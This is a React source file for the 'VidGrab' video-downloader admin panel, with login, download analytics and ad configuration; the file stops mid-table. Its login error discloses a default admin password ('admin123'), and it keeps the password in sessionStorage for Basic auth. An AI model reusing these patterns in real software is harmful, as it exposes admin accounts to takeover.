"use client";

import { useState, useEffect, useCallback } from "react";
import { createPortal } from "react-dom";
import { motion, AnimatePresence } from "framer-motion";
import {
  LayoutDashboard,
  Megaphone,
  ArrowLeftRight,
  PanelLeftClose,
  PanelRightClose,
  Settings,
  Lock,
  Download,
  Cookie,
  TrendingUp,
  Users,
  Eye,
  EyeOff,
  ChevronRight,
  Save,
  Plus,
  X,
  Globe,
  MonitorPlay,
  Youtube,
  Instagram,
  Twitter,
  Facebook,
  Menu,
  LogOut,
  ShieldCheck,
  Zap,
  BarChart3,
  Clock,
  HardDrive,
  Activity,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Switch } from "@/components/ui/switch";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Skeleton } from "@/components/ui/skeleton";
import { useToast } from "@/hooks/use-toast";

// ─── Types ────────────────────────────────────────────────
interface AdBanner {
  enabled: boolean;
  code: string;
}

interface RedirectAds {
  enabled: boolean;
  delay_ms: number;
  urls: string[];
  redirects_before_download: number;
  daily_free_download: boolean;
}

interface AdsConfig {
  top_banner: AdBanner;
  bottom_banner: AdBanner;
  redirect_ads: RedirectAds;
  side_banner_left: AdBanner;
  side_banner_right: AdBanner;
  has_password: boolean;
}

interface DownloadEntry {
  id: number;
  title: string;
  platform: string;
  quality: string;
  date: string;
  size: string;
  time_ago?: string;
}

interface PlatformStat {
  platform: string;
  count: number;
  percentage: number;
}

interface DailyStat {
  day: string;
  downloads: number;
}

interface DownloadStats {
  totalDownloads: number;
  todayDownloads: number;
  weeklyDownloads: number;
  monthlyDownloads: number;
  recentDownloads: DownloadEntry[];
  platformStats: PlatformStat[];
  dailyStats: DailyStat[];
}

type Page = "dashboard" | "top-banner" | "bottom-banner" | "redirect-ads" | "side-banners" | "settings" | "cookies";

// ─── Platform icon helper ────────────────────────────────
function PlatformIcon({ platform }: { platform: string }) {
  const cls = "h-4 w-4";
  switch (platform.toLowerCase()) {
    case "youtube":
      return <Youtube className={`${cls} text-red-400`} />;
    case "tiktok":
      return <svg viewBox="0 0 24 24" fill="currentColor" className={`${cls} text-pink-400`}><path d="M19.3 7.1A4.5 4.5 0 0016.9 4.7 6 6 0 0013.5 4h-3a6 6 0 00-3.4.7A4.5 4.5 0 004.7 7.1 6 6 0 004 10.5v3a6 6 0 00.7 3.4 4.5 4.5 0 002.4 2.4A6 6 0 0010.5 20h3a6 6 0 003.4-.7 4.5 4.5 0 002.4-2.4A6 6 0 0020 13.5v-3a6 6 0 00-.7-3.4zM12 16a4 4 0 110-8 4 4 0 010 8z"/></svg>;
    case "instagram":
      return <Instagram className={`${cls} text-pink-500`} />;
    case "facebook":
      return <Facebook className={`${cls} text-blue-400`} />;
    case "twitter/x":
      return <Twitter className={`${cls} text-sky-400`} />;
    default:
      return <Globe className={`${cls} text-muted-foreground`} />;
  }
}

function formatTimeAgo(dateStr: string): string {
  const now = new Date();
  const date = new Date(dateStr);
  const diffMs = now.getTime() - date.getTime();
  const diffMins = Math.floor(diffMs / 60000);
  if (diffMins < 1) return "Just now";
  if (diffMins < 60) return `${diffMins}m ago`;
  const diffHrs = Math.floor(diffMins / 60);
  if (diffHrs < 24) return `${diffHrs}h ago`;
  return `${Math.floor(diffHrs / 24)}d ago`;
}

// ─── Sidebar Component (extracted to avoid render-time creation) ────
function SidebarContent({
  sidebarOpen, currentPage, navItems,
  onNavigate, onSignOut,
}: {
  sidebarOpen: boolean; currentPage: Page;
  navItems: { id: Page; label: string; icon: React.ReactNode; group?: string }[];
  onNavigate: (page: Page) => void; onSignOut: () => void;
}) {
  return (
    <div className="flex flex-col h-full">
      {/* Logo */}
      <div className="p-5 pb-4">
        <div className="flex items-center gap-3">
          <img src="/assets/app-logo.png" alt="VidGrab" className="w-9 h-9 flex-shrink-0 rounded-xl" />
          {sidebarOpen && (
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
              <h1 className="text-base font-bold tracking-tight bg-gradient-to-r from-sky-400 to-violet-400 bg-clip-text text-transparent">
                VidGrab
              </h1>
              <p className="text-[10px] text-muted-foreground font-medium uppercase tracking-widest">Admin Panel</p>
            </motion.div>
          )}
        </div>
      </div>

      <Separator className="bg-border/50" />

      {/* Navigation */}
      <ScrollArea className="flex-1 px-3 py-3">
        <div className="space-y-1">
          {navItems.map((item) => {
            const isActive = currentPage === item.id;
            return (
              <div key={item.id}>
                {item.group && (
                  <p className={`text-[10px] font-semibold text-muted-foreground/50 uppercase tracking-widest mb-1.5 ${sidebarOpen ? "px-3" : "px-1 text-center"}`}>
                    {sidebarOpen ? item.group : item.group.charAt(0)}
                  </p>
                )}
                <button
                  onClick={() => onNavigate(item.id)}
                  className={`
                    w-full flex items-center gap-3 rounded-xl text-sm font-medium transition-all duration-200 group
                    ${sidebarOpen ? "px-3 py-2.5" : "px-0 py-2.5 justify-center"}
                    ${isActive
                      ? "bg-sky-400/10 text-sky-400 shadow-sm shadow-sky-400/5"
                      : "text-muted-foreground hover:text-foreground hover:bg-white/[0.03]"
                    }
                  `}
                >
                  <span className={`flex-shrink-0 transition-colors ${isActive ? "text-sky-400" : "text-muted-foreground group-hover:text-foreground"}`}>
                    {item.icon}
                  </span>
                  {sidebarOpen && (
                    <motion.span initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="truncate">
                      {item.label}
                    </motion.span>
                  )}
                  {sidebarOpen && isActive && (
                    <ChevronRight className="h-3.5 w-3.5 ml-auto text-sky-400/50" />
                  )}
                </button>
              </div>
            );
          })}
        </div>
      </ScrollArea>

      <Separator className="bg-border/50" />

      {/* Footer */}
      <div className="p-3">
        <button
          onClick={onSignOut}
          className={`
            w-full flex items-center gap-3 rounded-xl text-sm font-medium text-muted-foreground
            hover:text-red-400 hover:bg-red-400/5 transition-all duration-200
            ${sidebarOpen ? "px-3 py-2.5" : "px-0 py-2.5 justify-center"}
          `}
        >
          <LogOut className="h-4 w-4 flex-shrink-0" />
          {sidebarOpen && <span>Sign Out</span>}
        </button>
      </div>
    </div>
  );
}

// ─── Main Component ───────────────────────────────────────
export default function AdminPanel() {
  const [currentPage, setCurrentPage] = useState<Page>("dashboard");
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [passwordError, setPasswordError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isSaving, setIsSaving] = useState(false);
  const [config, setConfig] = useState<AdsConfig | null>(null);
  const [stats, setStats] = useState<DownloadStats | null>(null);
  const [redirectUrls, setRedirectUrls] = useState<string[]>([]);
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [backendConnected, setBackendConnected] = useState<boolean | null>(null);
  const { toast } = useToast();

  // ─── Auth headers helper ──
  const authHeaders = useCallback(() => {
    const pw = sessionStorage.getItem("adminPw") || password;
    return { Authorization: "Basic " + btoa(`admin:${pw}`) };
  }, [password]);

  // ─── Fetch stats ──────────────────────────────────────
  const fetchStats = async () => {
    try {
      const res = await fetch(`/api/admin/stats`, { headers: authHeaders() });
      if (res.ok) {
        const data = await res.json();
        setStats(data);
        setBackendConnected(true);
      } else { setBackendConnected(false); }
    } catch { setBackendConnected(false); }
  };

  // ─── Auth ─────────────────────────────────────────────
  const login = useCallback(async () => {
    if (!password.trim()) {
      setPasswordError("Please enter a password");
      return;
    }
    setIsLoading(true);
    try {
      const h: Record<string, string> = { Authorization: "Basic " + btoa(`admin:${password}`) };
      const res = await fetch(`/api/admin/config`, { headers: h });
      if (res.ok) {
        setIsAuthenticated(true);
        sessionStorage.setItem("adminPw", password);
        const data = await res.json();
        setConfig(data);
        fetchStats();
        toast({ title: "Welcome back!", description: "Connected to VidGrab backend." });
      } else {
        const errData = await res.json().catch(() => ({}));
        setPasswordError(errData.detail || "Invalid password. Try admin123");
      }
    } catch {
      setPasswordError("Connection failed. Is the server running?");
    } finally {
      setIsLoading(false);
    }
  }, [password, toast, fetchStats]);

  useEffect(() => {
    const saved = sessionStorage.getItem("adminPw");
    if (saved) {
      (async () => {
        try {
          const h: Record<string, string> = { Authorization: "Basic " + btoa(`admin:${saved}`) };
          const res = await fetch(`/api/admin/config`, { headers: h });
          if (res.ok) {
            setIsAuthenticated(true);
            setPassword(saved);
            const data = await res.json();
            setConfig(data);
            fetchStats();
          } else {
            sessionStorage.removeItem("adminPw");
          }
        } catch { /* silent */ }
      })();
    }
  }, [fetchStats]);

  // ─── Auto-refresh stats every 8 seconds ─────────────────
  useEffect(() => {
    if (!isAuthenticated) return;
    const interval = setInterval(fetchStats, 8000);
    return () => clearInterval(interval);
  }, [isAuthenticated, fetchStats]);

  // ─── Save config ──────────────────────────────────────
  const saveConfig = async (section: string, payload: Record<string, unknown>) => {
    setIsSaving(true);
    try {
      const h: Record<string, string> = { "Content-Type": "application/json", ...authHeaders() };
      const res = await fetch(`/api/admin/config`, { method: "POST", headers: h, body: JSON.stringify(payload) });
      if (res.status === 401) {
        toast({ title: "Authentication failed", description: "Please log in again.", variant: "destructive" });
        setIsAuthenticated(false);
        sessionStorage.removeItem("adminPw");
      } else if (res.ok) {
        toast({ title: "Saved!", description: `${section} settings saved successfully.` });
      } else {
        toast({ title: "Error", description: "Failed to save settings.", variant: "destructive" });
      }
    } catch {
      toast({ title: "Error", description: "Network error. Please try again.", variant: "destructive" });
    } finally {
      setIsSaving(false);
    }
  };

  // ─── Sidebar handlers (before early return for hooks rule) ──
  const handleNavigate = useCallback((page: Page) => {
    setCurrentPage(page);
    setMobileMenuOpen(false);
  }, []);

  const handleSignOut = useCallback(() => {
    setIsAuthenticated(false);
    sessionStorage.removeItem("adminPw");
    setPassword("");
    setBackendConnected(null);
  }, []);

  // ─── Login Screen ─────────────────────────────────────
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center relative overflow-hidden">
        {/* Background effects */}
        <div className="vidgrab-orb w-[500px] h-[500px] opacity-20 -top-[18%] -left-[12%] bg-[radial-gradient(circle,rgba(56,189,248,0.3),transparent_70%)] animate-[oF_20s_ease-in-out_infinite]" />
        <div className="vidgrab-orb w-[400px] h-[400px] opacity-20 -bottom-[12%] -right-[8%] bg-[radial-gradient(circle,rgba(139,92,246,0.22),transparent_70%)] animate-[oF_26s_ease-in-out_infinite]" style={{ animationDelay: "-7s" }} />
        <div className="vidgrab-grid" />

        <motion.div
          initial={{ opacity: 0, y: 20, scale: 0.98 }}
          animate={{ opacity: 1, y: 0, scale: 1 }}
          transition={{ duration: 0.5, ease: [0.4, 0, 0.2, 1] }}
          className="relative z-10 w-full max-w-md mx-4"
        >
          <Card className="border-border/50 bg-card backdrop-blur-xl shadow-2xl">
            <CardHeader className="text-center pb-2">
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ delay: 0.2, type: "spring", stiffness: 200 }}
                className="mx-auto mb-4 w-16 h-16 rounded-2xl bg-gradient-to-br from-sky-400 to-violet-500 flex items-center justify-center shadow-lg shadow-sky-500/20"
              >
                <ShieldCheck className="h-8 w-8 text-white" />
              </motion.div>
              <CardTitle className="text-2xl font-bold bg-gradient-to-r from-sky-400 to-violet-400 bg-clip-text text-transparent">
                VidGrab Admin
              </CardTitle>
              <CardDescription className="text-muted-foreground mt-2">
                Enter your admin password to continue
              </CardDescription>
            </CardHeader>
            <CardContent className="pt-4">
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="password" className="text-xs font-medium text-muted-foreground uppercase tracking-wider">
                    Password
                  </Label>
                  <div className="relative">
                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                    <Input
                      id="password"
                      type={showPassword ? "text" : "password"}
                      placeholder="Enter admin password"
                      value={password}
                      onChange={(e) => { setPassword(e.target.value); setPasswordError(""); }}
                      onKeyDown={(e) => e.key === "Enter" && login()}
                      className="pl-10 pr-10 bg-background/50 border-border/50 focus:border-sky-400/50 focus:ring-sky-400/20 h-12"
                      autoFocus
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
                      tabIndex={-1}
                    >
                      {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </button>
                  </div>
                  {passwordError && (
                    <motion.p initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} className="text-sm text-red-400">
                      {passwordError}
                    </motion.p>
                  )}
                </div>

                <Button
                  onClick={login}
                  disabled={isLoading}
                  className="w-full h-12 bg-gradient-to-r from-sky-400 to-sky-500 hover:from-sky-500 hover:to-sky-600 text-black font-semibold text-sm shadow-lg shadow-sky-500/25 hover:shadow-sky-500/40 transition-all duration-300 hover:-translate-y-0.5"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="h-4 w-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                      Verifying...
                    </div>
                  ) : (
                    <div className="flex items-center gap-2">
                      <ShieldCheck className="h-4 w-4" />
                      Sign In
                    </div>
                  )}
                </Button>
              </div>

            </CardContent>
          </Card>
        </motion.div>
      </div>
    );
  }

  // ─── Navigation Items ─────────────────────────────────
  const navItems: { id: Page; label: string; icon: React.ReactNode; group?: string }[] = [
    { id: "dashboard", label: "Dashboard", icon: <LayoutDashboard className="h-4 w-4" /> },
    { id: "top-banner", label: "Top Banner", icon: <Megaphone className="h-4 w-4" />, group: "Ad Management" },
    { id: "bottom-banner", label: "Bottom Banner", icon: <Megaphone className="h-4 w-4" /> },
    { id: "redirect-ads", label: "Redirect Ads", icon: <ArrowLeftRight className="h-4 w-4" /> },
    { id: "side-banners", label: "Side Banners", icon: <PanelLeftClose className="h-4 w-4" /> },
    { id: "cookies", label: "Cookies", icon: <Cookie className="h-4 w-4" />, group: "System" },
    { id: "settings", label: "Settings", icon: <Settings className="h-4 w-4" />, group: "System" },
  ];

  // ─── Render page content ──────────────────────────────
  const renderContent = () => {
    if (!config) return <Skeleton className="h-96 w-full" />;

    switch (currentPage) {
      case "dashboard":
        return <DashboardPage stats={stats} backendConnected={backendConnected} onRefresh={fetchStats} />;
      case "top-banner":
        return <BannerPage
          title="Top Banner Ad"
          description="Configure the banner ad displayed at the top of the VidGrab homepage"
          icon={<Megaphone className="h-5 w-5" />}
          enabled={config.top_banner.enabled}
          code={config.top_banner.code}
          onSave={(enabled, code) => {
            setConfig(prev => prev ? { ...prev, top_banner: { enabled, code } } : prev);
            saveConfig("Top Banner", { top_banner: { enabled, code } });
          }}
        />;
      case "bottom-banner":
        return <BannerPage
          title="Bottom Banner Ad"
          description="Configure the banner ad displayed at the bottom of the VidGrab homepage"
          icon={<Megaphone className="h-5 w-5" />}
          enabled={config.bottom_banner.enabled}
          code={config.bottom_banner.code}
          onSave={(enabled, code) => {
            setConfig(prev => prev ? { ...prev, bottom_banner: { enabled, code } } : prev);
            saveConfig("Bottom Banner", { bottom_banner: { enabled, code } });
          }}
        />;
      case "redirect-ads":
        return <RedirectAdsPage
          enabled={config.redirect_ads.enabled}
          delay={config.redirect_ads.delay_ms}
          urls={config.redirect_ads.urls}
          redirectsBefore={config.redirect_ads.redirects_before_download}
          dailyFree={config.redirect_ads.daily_free_download}
          onSave={(enabled, delay_ms, urls, redirects_before_download, daily_free_download) => {
            setConfig(prev => prev ? { ...prev, redirect_ads: { enabled, delay_ms, urls, redirects_before_download, daily_free_download } } : prev);
            saveConfig("Redirect Ads", { redirect_ads: { enabled, delay_ms, urls, redirects_before_download, daily_free_download } });
          }}
        />;
      case "side-banners":
        return <SideBannersPage
          leftEnabled={config.side_banner_left.enabled}
          leftCode={config.side_banner_left.code}
          rightEnabled={config.side_banner_right.enabled}
          rightCode={config.side_banner_right.code}
          onSave={(side_banner_left, side_banner_right) => {
            setConfig(prev => prev ? { ...prev, side_banner_left, side_banner_right } : prev);
            saveConfig("Side Banners", { side_banner_left, side_banner_right });
          }}
        />;
      case "cookies":
        return <CookiesPage
          authHeaders={authHeaders}
          onError={(msg: string) => toast({ title: "Error", description: msg, variant: "destructive" })}
        />;
      case "settings":
        return <SettingsPage
          hasPassword={config.has_password}
          onSave={(admin_password) => {
            saveConfig("Settings", { admin_password });
          }}
          backendConnected={backendConnected}
        />;
      default:
        return null;
    }
  };

  return (
    <>
      {/* Background effects — rendered via portal to body, always fixed, never scroll */}
      {createPortal(
        <>
          <div className="vidgrab-orb w-[520px] h-[520px] opacity-[0.12] -top-[18%] -left-[12%] bg-[radial-gradient(circle,rgba(56,189,248,0.3),transparent_70%)] animate-[oF_20s_ease-in-out_infinite]" />
          <div className="vidgrab-orb w-[420px] h-[420px] opacity-[0.10] -bottom-[12%] -right-[8%] bg-[radial-gradient(circle,rgba(139,92,246,0.22),transparent_70%)] animate-[oF_26s_ease-in-out_infinite]" style={{ animationDelay: "-7s" }} />
          <div className="vidgrab-grid" />
        </>,
        document.body
      )}

      <div className="h-screen overflow-hidden flex relative">

      {/* Desktop Sidebar — sticky, never scrolls with content */}
      <motion.aside
        initial={false}
        animate={{ width: sidebarOpen ? 260 : 72 }}
        transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
        className="hidden lg:flex flex-col h-screen border-r border-border/50 bg-sidebar backdrop-blur-xl z-30 relative flex-shrink-0 sticky top-0 self-start"
      >
        <SidebarContent
          sidebarOpen={sidebarOpen}
          currentPage={currentPage}
          navItems={navItems}
          onNavigate={handleNavigate}
          onSignOut={handleSignOut}
        />
        {/* Toggle button */}
        <button
          onClick={() => setSidebarOpen(!sidebarOpen)}
          className="absolute -right-3 top-8 w-6 h-6 rounded-full bg-card border border-border/50 flex items-center justify-center text-muted-foreground hover:text-foreground hover:border-sky-400/30 transition-all z-40 shadow-lg"
        >
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" className={`h-3 w-3 transition-transform ${sidebarOpen ? "" : "rotate-180"}`}>
            <path d="M15 18l-6-6 6-6" />
          </svg>
        </button>
      </motion.aside>

      {/* Mobile sidebar overlay */}
      <AnimatePresence>
        {mobileMenuOpen && (
          <>
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="fixed inset-0 bg-black/60 backdrop-blur-sm z-40 lg:hidden"
              onClick={() => setMobileMenuOpen(false)}
            />
            <motion.aside
              initial={{ x: -280 }}
              animate={{ x: 0 }}
              exit={{ x: -280 }}
              transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
              className="fixed left-0 top-0 bottom-0 w-[260px] border-r border-border/50 bg-sidebar backdrop-blur-xl z-50 lg:hidden"
            >
              <SidebarContent
                sidebarOpen={true}
                currentPage={currentPage}
                navItems={navItems}
                onNavigate={handleNavigate}
                onSignOut={handleSignOut}
              />
            </motion.aside>
          </>
        )}
      </AnimatePresence>

      {/* Main Content — only this area scrolls */}
      <main className="flex-1 min-h-0 h-screen overflow-y-auto relative z-10" style={{ scrollBehavior: 'smooth' }}>
        {/* Top bar */}
        <header className="sticky top-0 z-20 border-b border-border/50 bg-background/80 backdrop-blur-xl">
          <div className="flex items-center justify-between px-6 h-14">
            <div className="flex items-center gap-3">
              <button
                onClick={() => setMobileMenuOpen(true)}
                className="lg:hidden p-2 rounded-lg hover:bg-white/[0.03] text-muted-foreground hover:text-foreground transition-colors"
              >
                <Menu className="h-5 w-5" />
              </button>
              <div className="flex items-center gap-2">
                <h2 className="text-sm font-semibold text-foreground">
                  {navItems.find(n => n.id === currentPage)?.label || "Dashboard"}
                </h2>
                <Badge variant="secondary" className="text-[10px] font-medium bg-sky-400/10 text-sky-400 border-sky-400/20">
                  {currentPage === "dashboard" ? "Live" : "Edit"}
                </Badge>
              </div>
            </div>
            <div className="flex items-center gap-2">
              <div className={`flex items-center gap-2 px-3 py-1.5 rounded-lg border ${backendConnected === true ? "bg-green-400/10 border-green-400/20" : backendConnected === false ? "bg-amber-400/10 border-amber-400/20" : "bg-green-400/10 border-green-400/20"}`}>
                <div className={`w-2 h-2 rounded-full ${backendConnected === true ? "bg-green-400" : backendConnected === false ? "bg-amber-400" : "bg-green-400"} ${backendConnected !== false ? "animate-pulse" : ""}`} />
                <span className={`text-xs font-medium ${backendConnected === true ? "text-green-400" : backendConnected === false ? "text-amber-400" : "text-green-400"}`}>
                  {backendConnected === true ? "Backend Connected" : backendConnected === false ? "Offline Mode" : "Online"}
                </span>
              </div>
              <div className="w-8 h-8 rounded-full bg-gradient-to-br from-sky-400 to-violet-500 flex items-center justify-center text-xs font-bold text-white shadow-md">
                A
              </div>
            </div>
          </div>
        </header>

        {/* Page Content */}
        <div className="p-6 max-w-6xl">
          <AnimatePresence mode="wait">
            <motion.div
              key={currentPage}
              initial={{ opacity: 0, y: 12 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -12 }}
              transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
            >
              {renderContent()}
            </motion.div>
          </AnimatePresence>
        </div>
      </main>
    </div>
    </>
  );
}

// ─── Dashboard Page ──────────────────────────────────────
function DashboardPage({ stats, backendConnected, onRefresh }: { stats: DownloadStats | null; backendConnected: boolean | null; onRefresh: () => void }) {
  const { toast } = useToast();
  const [clearing, setClearing] = useState(false);

  if (!stats) {
    return (
      <div className="space-y-6">
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          {[1, 2, 3, 4].map(i => <Skeleton key={i} className="h-32 rounded-2xl" />)}
        </div>
        <Skeleton className="h-80 rounded-2xl" />
      </div>
    );
  }

  const isEmpty = stats.totalDownloads === 0;

  const statCards = [
    { label: "Total Downloads", value: stats.totalDownloads.toLocaleString(), icon: <Download className="h-5 w-5" />, color: "cyan", change: isEmpty ? "—" : `${stats.totalDownloads} total` },
    { label: "Today", value: stats.todayDownloads.toLocaleString(), icon: <Zap className="h-5 w-5" />, color: "green", change: isEmpty ? "—" : "today" },
    { label: "This Week", value: stats.weeklyDownloads.toLocaleString(), icon: <TrendingUp className="h-5 w-5" />, color: "purple", change: "7 days" },
    { label: "This Month", value: stats.monthlyDownloads.toLocaleString(), icon: <BarChart3 className="h-5 w-5" />, color: "amber", change: "30 days" },
  ];

  const maxDaily = Math.max(...stats.dailyStats.map(d => d.downloads), 1);

  const handleClearHistory = async () => {
    if (!confirm("Are you sure you want to clear all download history? This cannot be undone.")) return;
    setClearing(true);
    try {
      const res = await fetch(`/api/admin/downloads`, { method: "DELETE", headers: { Authorization: "Basic " + btoa(`admin:${sessionStorage.getItem("adminPw")}`) } });
      if (res.ok) {
        toast({ title: "History cleared", description: "All download history has been deleted." });
        onRefresh();
      } else {
        toast({ title: "Error", description: "Failed to clear history.", variant: "destructive" });
      }
    } catch {
      toast({ title: "Error", description: "Network error.", variant: "destructive" });
    } finally {
      setClearing(false);
    }
  };

  return (
    <div className="space-y-6">
      {/* Header row with actions */}
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-lg font-bold">Download Analytics</h2>
          <p className="text-xs text-muted-foreground mt-0.5">
            {backendConnected ? "Real-time data from VidGrab backend" : "No backend connected — showing empty state"}
          </p>
        </div>
        <div className="flex items-center gap-2">
          <Button variant="outline" size="sm" onClick={onRefresh} className="h-8 text-xs gap-1.5 border-border/50 hover:bg-white/[0.03]">
            <Activity className="h-3 w-3" /> Refresh
          </Button>
          {!isEmpty && (
            <Button variant="outline" size="sm" onClick={handleClearHistory} disabled={clearing} className="h-8 text-xs gap-1.5 border-red-400/20 text-red-400 hover:bg-red-400/10 hover:text-red-400">
              <X className="h-3 w-3" /> {clearing ? "Clearing..." : "Clear History"}
            </Button>
          )}
        </div>
      </div>

      {/* Stat Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {statCards.map((card, i) => (
          <motion.div
            key={card.label}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: i * 0.08, duration: 0.4 }}
            className={`stat-card stat-card-${card.color} rounded-2xl border border-border/50 bg-card/80 backdrop-blur-sm p-5 hover:border-border transition-all duration-300`}
          >
            <div className="flex items-start justify-between mb-4">
              <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${
                card.color === "cyan" ? "bg-sky-400/10 text-sky-400" :
                card.color === "green" ? "bg-green-400/10 text-green-400" :
                card.color === "purple" ? "bg-violet-400/10 text-violet-400" :
                "bg-amber-400/10 text-amber-400"
              }`}>
                {card.icon}
              </div>
              <Badge variant="secondary" className="text-[10px] font-medium bg-green-400/10 text-green-400/70 border-green-400/20">
                {card.change}
              </Badge>
            </div>
            <p className="text-2xl font-bold tracking-tight">{card.value}</p>
            <p className="text-xs text-muted-foreground mt-1 font-medium">{card.label}</p>
          </motion.div>
        ))}
      </div>

      {/* Charts row */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
        {/* Weekly chart */}
        <Card className="lg:col-span-2 border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
          <CardHeader className="pb-4">
            <div className="flex items-center justify-between">
              <div>
                <CardTitle className="text-sm font-semibold">Weekly Downloads</CardTitle>
                <CardDescription className="text-xs mt-1">Downloads over the past 7 days</CardDescription>
              </div>
              {backendConnected && (
                <Badge variant="secondary" className="text-[10px] bg-sky-400/10 text-sky-400 border-sky-400/20">
                  <Activity className="h-3 w-3 mr-1" /> Live
                </Badge>
              )}
            </div>
          </CardHeader>
          <CardContent>
            <div className="flex items-end gap-3 h-40">
              {stats.dailyStats.map((d, i) => (
                <div key={d.day} className="flex-1 flex flex-col items-center self-stretch">
                  <span className="text-[10px] font-medium text-muted-foreground">{d.downloads}</span>
                  <div className="flex-1 w-full flex flex-col justify-end min-h-0">
                    <motion.div
                      initial={{ height: 0 }}
                      animate={{ height: `${(d.downloads / maxDaily) * 100}%` }}
                      transition={{ delay: i * 0.08, duration: 0.6, ease: [0.4, 0, 0.2, 1] }}
                      className="w-full rounded-t-lg bg-gradient-to-t from-sky-400/20 to-sky-400/60 min-h-[3px] relative group cursor-pointer hover:from-sky-400/30 hover:to-sky-400/80 transition-all"
                    >
                      <div className="absolute -top-8 left-1/2 -translate-x-1/2 bg-card border border-border/50 rounded-md px-2 py-1 text-[10px] font-medium opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap shadow-lg">
                        {d.downloads} downloads
                      </div>
                    </motion.div>
                  </div>
                  <span className="text-[10px] font-medium text-muted-foreground">{d.day}</span>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Platform breakdown */}
        <Card className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
          <CardHeader className="pb-4">
            <CardTitle className="text-sm font-semibold">Platform Breakdown</CardTitle>
            <CardDescription className="text-xs mt-1">Downloads by platform</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {stats.platformStats.length === 0 ? (
              <div className="flex flex-col items-center justify-center py-8 text-muted-foreground">
                <MonitorPlay className="h-8 w-8 mb-2 opacity-30" />
                <p className="text-xs">No data yet</p>
              </div>
            ) : stats.platformStats.map((p) => (
              <div key={p.platform} className="space-y-2">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <PlatformIcon platform={p.platform} />
                    <span className="text-xs font-medium">{p.platform}</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="text-xs text-muted-foreground">{p.count.toLocaleString()}</span>
                    <span className="text-[10px] font-semibold text-sky-400">{p.percentage}%</span>
                  </div>
                </div>
                <div className="h-1.5 bg-muted rounded-full overflow-hidden">
                  <motion.div
                    initial={{ width: 0 }}
                    animate={{ width: `${p.percentage}%` }}
                    transition={{ duration: 0.8, ease: [0.4, 0, 0.2, 1] }}
                    className="h-full rounded-full bg-gradient-to-r from-sky-400 to-violet-400"
                  />
                </div>
              </div>
            ))}
          </CardContent>
        </Card>
      </div>

      {/* Recent downloads table */}
      <Card className="border-border/50 bg-card/80 backdrop-blur-sm rounded-2xl">
        <CardHeader className="pb-4">
          <div className="flex items-center justify-between">
            <div>
              <CardTitle className="text-sm font-semibold">Recent Downloads</CardTitle>
              <CardDescription className="text-xs mt-1">
                {isEmpty ? "No downloads recorded yet — they will appear here automatically" : "Latest video downloads from all platforms"}
              </CardDescription>
            </div>
            {!isEmpty && (
              <Badge variant="secondary" className="text-[10px] bg-violet-400/10 text-violet-400 border-violet-400/20">
                <Clock className="h-3 w-3 mr-1" /> Last {stats.recentDownloads.length}
              </Badge>
            )}
          </div>
        </CardHeader>
        <CardContent>
          {isEmpty ? (
            <div className="flex flex-col items-center justify-center py-16 text-muted-foreground">
              <div className="w-16 h-16 rounded-2xl bg-muted/30 flex items-center justify-center mb-4">
                <Download className="h-8 w-8 opacity-30" />
              </div>
              <p className="text-sm font-medium mb-1">No downloads yet</p>
              <p className="text-xs text-muted-foreground/70 max-w-[300px] text-center leading-relaxed">
                Download history will be tracked automatically when users download videos through VidGrab.
              </p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b border-border/50">
                    <th className="text-left text-[10px] font-semibold text-muted-foreground uppercase tracking-wider pb-3 pr-4">Video</th>
                    <th className="text-left text-[10px] font-semibold text-muted-foreground uppercase tracking-wider pb-3 pr-4">Platform</th>
